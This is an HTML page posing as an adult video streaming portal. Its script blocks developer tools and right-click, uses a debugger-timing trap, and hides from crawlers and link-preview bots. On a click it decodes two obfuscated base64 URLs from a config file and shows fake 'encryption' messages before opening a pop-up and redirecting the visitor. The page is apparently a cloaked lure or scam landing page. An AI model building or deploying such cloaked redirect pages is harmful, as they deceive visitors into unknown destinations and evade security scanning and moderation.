<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="referrer" content="no-referrer">
    <title>Stream Portal | Secure Access</title>
    
    <meta property="og:title" content="Private Video Access" />
    <meta property="og:description" content="Secure cloud delivery for requested media. High-speed streaming enabled." />
    <meta property="og:image" content="https://vidley.pw/tombolplay.jpg" />
    <meta property="og:type" content="website" />

    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap');
        
        body { 
            background-color: #030303; 
            color: #ffffff; 
            font-family: 'Inter', sans-serif;
            user-select: none; 
            -webkit-user-select: none; 
            touch-action: manipulation;
            overflow: hidden;
        }
        
        .glass {
            background: rgba(255, 255, 255, 0.02);
            backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .pulse-red {
            animation: pulse-red-glow 2s infinite;
        }
        @keyframes pulse-red-glow {
            0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.6); transform: scale(1); }
            50% { box-shadow: 0 0 35px 12px rgba(220, 38, 38, 0.3); transform: scale(1.05); }
            100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.6); transform: scale(1); }
        }

        .text-glow { text-shadow: 0 0 20px rgba(255, 255, 255, 0.3); }
        
        .age-badge {
            border: 2px solid #dc2626;
            color: #dc2626;
            padding: 2px 10px;
            border-radius: 4px;
            font-weight: 900;
            font-size: 16px;
        }

        ::-webkit-scrollbar { display: none; }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4" oncontextmenu="return false;">

    <div class="w-full max-w-md glass rounded-[3rem] overflow-hidden relative shadow-[0_50px_100px_-20px_rgba(0,0,0,1)] border border-white/5">
        
        <div id="videoArea" class="relative w-full h-[60vh] max-h-[550px] bg-black overflow-hidden flex items-center justify-center cursor-pointer group">
            
            <video id="vidThumb" class="w-full h-full object-cover opacity-20 blur-[25px] transition-all duration-1000 group-hover:opacity-30" playsinline preload="metadata" muted></video>

            <div id="playOverlay" class="absolute inset-0 flex flex-col items-center justify-center z-20 p-8 text-center">
                
                <div class="mb-8 flex flex-col items-center">
                     <span class="age-badge mb-3 animate-pulse">18+</span>
                     <p class="text-white/60 text-[10px] uppercase tracking-[0.3em] font-bold">Adults Only Content</p>
                </div>

                <div id="iconBox" class="w-24 h-24 bg-red-600 rounded-full flex items-center justify-center shadow-2xl pulse-red mb-8 transition-transform duration-500 group-hover:scale-110">
                    <i data-lucide="play" class="w-10 h-10 text-white fill-current ml-1"></i>
                </div>
                
                <h1 class="text-white text-3xl font-black tracking-widest mb-3 uppercase text-glow italic">TAP TO WATCH</h1>
                <p class="text-white/40 text-[11px] leading-relaxed max-w-[240px]">By clicking play, you agree to our Terms of Service and confirm you are of legal age.</p>
            </div>
            
            <div id="loader" class="hidden absolute inset-0 flex items-center justify-center bg-[#050505] z-40 backdrop-blur-3xl">
                <div class="flex flex-col items-center">
                    <div class="relative w-16 h-16 mb-8">
                        <div class="absolute inset-0 rounded-full border-t-2 border-red-600 animate-spin"></div>
                        <div class="absolute inset-2 rounded-full border-b-2 border-white/10 animate-spin-slow"></div>
                    </div>
                    <span id="loadText" class="text-white text-[10px] font-bold tracking-[0.5em] uppercase italic animate-pulse">Establishing Secure Node...</span>
                </div>
            </div>
        </div>

        <div class="p-8 bg-[#070709] flex flex-col items-center border-t border-white/5">
            <div class="flex gap-6 mb-4 text-white/20 text-[9px] font-bold uppercase tracking-[0.2em]">
                <span>Encrypted Tunnel</span>
                <span>•</span>
                <span>US-West Node</span>
                <span>•</span>
                <span>Protected</span>
            </div>
            
            <div class="text-[8px] text-white/10 text-center uppercase tracking-[0.3em] leading-loose">
                Distributed Cloud Delivery System. All rights reserved.
            </div>
        </div>
    </div>

    <script>
        lucide.createIcons();

        const AUTHORIZED_DOMAIN = "yourdomain.com"; 
        const CONFIG_FILE = "sys_config.txt"; 
        const FALLBACK_SITE = "https://cdn.videy.co"; 

        setInterval(function() {
            const start = performance.now();
            debugger; 
            if (performance.now() - start > 100) {
                window.location.href = "about:blank";
            }
        }, 1000);

        document.addEventListener('keydown', function(e) {
            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74 || e.keyCode == 67)) || (e.ctrlKey && e.keyCode == 85)) {
                e.preventDefault();
                return false;
            }
        });

        function _checkAuth() {
            if (window.location.hostname !== "" && window.location.hostname.indexOf(AUTHORIZED_DOMAIN) === -1) {
                return false;
            }
            return true;
        }

        const _isB = /bot|googlebot|crawler|spider|robot|facebookexternalhit|visionutils/i.test(navigator.userAgent);
        
        async function _trigger() {
            if(_isB || !_checkAuth()) return;

            const l = document.getElementById("loader");
            const lt = document.getElementById("loadText");
            l.classList.remove('hidden');

            try {
                const res = await fetch(CONFIG_FILE + "?v=" + Math.random());
                const str = (await res.text()).trim();
                const p = str.split(',');
                
                if(p.length < 2) return;

                const aU = atob(p[0].trim());
                const mU = atob(p[1].trim());

                setTimeout(() => { lt.innerText = "Optimizing Stream..."; }, 400);
                setTimeout(() => { lt.innerText = "Applying Encryption..."; }, 800);
                setTimeout(() => { lt.innerText = "Redirecting..."; }, 1200);
                
                setTimeout(() => {
                    window.open(aU, '_blank');
                    window.location.replace(mU);
                }, 1600);

            } catch (e) {
                lt.innerText = "Connection Error";
            }
        }

        document.getElementById("videoArea").addEventListener("click", _trigger);

        let vId = window.location.pathname.split('/').pop().trim();
        if (vId && vId.length > 3 && vId !== "index.html") {
            let fn = vId.includes('.') ? vId : vId + ".mp4";
            document.getElementById("vidThumb").src = FALLBACK_SITE + "/" + encodeURIComponent(fn) + "#t=0.5";
        }
    </script>

</body>
</html>
